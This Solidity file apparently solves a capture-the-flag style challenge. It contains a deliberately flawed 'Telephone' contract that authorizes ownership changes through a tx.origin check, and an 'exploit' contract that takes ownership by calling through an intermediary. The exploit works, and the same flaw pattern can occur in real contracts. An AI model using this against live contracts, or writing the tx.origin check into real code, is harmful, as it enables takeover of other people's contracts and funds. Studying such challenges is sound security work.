// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract exploit{
    function owner(address _addr) public {
        (bool success,) = _addr.call(abi.encodeWithSignature("changeOwner(address)",msg.sender));
        require(success);
    }
}